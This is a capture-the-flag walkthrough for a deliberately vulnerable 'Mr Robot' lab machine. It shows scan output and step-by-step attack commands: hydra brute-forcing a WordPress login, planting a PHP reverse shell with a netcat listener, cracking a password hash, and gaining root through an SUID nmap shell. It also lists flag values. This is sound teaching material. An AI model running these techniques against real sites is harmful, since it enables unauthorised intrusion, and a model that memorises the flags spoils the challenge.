# Mr Robot CTF

**Title:** Mr Robot<br>
**IP Address:** 10.10.221.177<br>

## Scans

### NMAP Scan
```
Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-18 21:41 PST
Nmap scan report for 10.10.221.177 (10.10.221.177)
Host is up (0.27s latency).
Not shown: 997 filtered ports
PORT    STATE  SERVICE  VERSION
22/tcp  closed ssh
80/tcp  open   http     Apache httpd
443/tcp open   ssl/http Apache httpd

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 49.49 seconds

```

### GoBuster Scan
```
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.221.177
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2021/06/18 21:55:23 Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 236] [--> http://10.10.221.177/images/]
/blog                 (Status: 301) [Size: 234] [--> http://10.10.221.177/blog/]  
/rss                  (Status: 301) [Size: 0] [--> http://10.10.221.177/feed/]    
/sitemap              (Status: 200) [Size: 0]                                     
/login                (Status: 302) [Size: 0] [--> http://10.10.221.177/wp-login.php]
/0                    (Status: 301) [Size: 0] [--> http://10.10.221.177/0/]          
/feed                 (Status: 301) [Size: 0] [--> http://10.10.221.177/feed/]       
/video                (Status: 301) [Size: 235] [--> http://10.10.221.177/video/]    
/image                (Status: 301) [Size: 0] [--> http://10.10.221.177/image/]      
/atom                 (Status: 301) [Size: 0] [--> http://10.10.221.177/feed/atom/]  
/wp-content           (Status: 301) [Size: 240] [--> http://10.10.221.177/wp-content/]
/admin                (Status: 301) [Size: 235] [--> http://10.10.221.177/admin/]     
/audio                (Status: 301) [Size: 235] [--> http://10.10.221.177/audio/]     
/wp-login             (Status: 200) [Size: 2613]                                      
/intro                (Status: 200) [Size: 516314]                                    
/css                  (Status: 301) [Size: 233] [--> http://10.10.221.177/css/]       
/rss2                 (Status: 301) [Size: 0] [--> http://10.10.221.177/feed/]        
/license              (Status: 200) [Size: 309]                                       
/wp-includes          (Status: 301) [Size: 241] [--> http://10.10.221.177/wp-includes/]
/js                   (Status: 301) [Size: 232] [--> http://10.10.221.177/js/]         
/Image                (Status: 301) [Size: 0] [--> http://10.10.221.177/Image/]        
/rdf                  (Status: 301) [Size: 0] [--> http://10.10.221.177/feed/rdf/]     
/page1                (Status: 301) [Size: 0] [--> http://10.10.221.177/]              
/readme               (Status: 200) [Size: 64]                                         
/robots               (Status: 200) [Size: 41]
```

## Flags

### Flag 1
1. After the GoBuster scan, `/robots` directory was found. It shows the content:
  ```
  User-agent: *
  fsocity.dic
  key-1-of-3.txt
  ```
2. Visting the page on the directory `/key-1-of-3.txt` gives the first flag:
  ```
  073403c8a58a1f80d943455fb30724b9
  ```


### Flag 2
1. After the GoBuster scan, a `/login` page and `/robots` directory was found. The `/robots` directory shows the content:
  ```
  User-agent: *
  fsocity.dic
  key-1-of-3.txt
  ```
2. Download `fsocity.dic` by going to the directory `/fsocity.dic` and saving the raw page.
3. Brute force username and password on the `/login` page using hydra.
 
 ***For username***
  ```
  $ hydra -L fsocity.dic -p any 10.10.221.177 http-post-form "/wp-login.php:log=^USER^&pwd=^PWD^:Invalid username" -t 30

  [80][http-post-form] host: 10.10.221.177   login: Elliot   password: any
  ```
  ***For password***
  ```
  $ hydra -l Elliot -P fsocity.dic 10.10.221.177 http-post-form "/wp-login.php:log=^USER^&pwd=^PWD^:The password you entered for the username" -t 30
  

  ```
  ***Credentials***: `Elliot:ER28-0652`

4. Start a `netcat` listener. Use a port that is usually trusted by firewalls.
  ```
  $ rlwrap nc -lvnp 1520
  ```
5. Use a PHP reverse shell and set the corresponding listener IP address and port.
6. In the admin Dashboard, go to Appearance > Editor, update a PHP file with the code from the PHP reverse shell (e.g. `archive.php`).
7. Load the edited PHP file (e.g. if using `archive.php`, load the URL `http://10.10.221.177/wp-content/themes/twentyfifteen/archive.php`). Reverse shell must now be activated.
8. Go to `/home/robot` directory and open `password.raw-md5` file.
  ```
  robot:c3fcd3d76192e4007dfb496cca67e13b
  ```
9. Decrypt the MD5 hash.
  ```
  Using CrackStation (crackstation.net)

                Hash    	            Type	        Result
  c3fcd3d76192e4007dfb496cca67e13b	md5	    abcdefghijklmnopqrstuvwxyz
  ```
10. Spawn TTY shell in the target machine using Python.
  ```
  $ python -c 'import pty; pty.spawn("/bin/sh")'
  ```
11. Login to `robot` account using `su robot` with the password: `abcdefghijklmnopqrstuvwxyz`.
 
 ***Credentials:*** `robot:abcdefghijklmnopqrstuvwxyz`

12. Go to `/home/robot` directory and open `key-2-of-3.txt` file.
  ```
  822c73956184f694993bede3eb39f959
  ```


### Flag 3
1. While using the account `robot`. Gain priveleged access using SUID binary from `nmap`.

  Note: This was found by locating files with SUID binary bit turned on using the command:
  ```
  $ find / -perm +6000 2> /dev/null | grep '/bin/'
  ```
2. Spawn a shell using NMAP (refer to instructions at gtfobins).
  ```
  $ nmap --interactive
  nmap> !sh
  ```
3. Now, as the `root` user, `/root` directory is now accessible. The file `key-3-of-3.txt` is located in the same directory and can be read.
  ```
  04787ddef27c3dee1ee161b21670b4e4
  ```
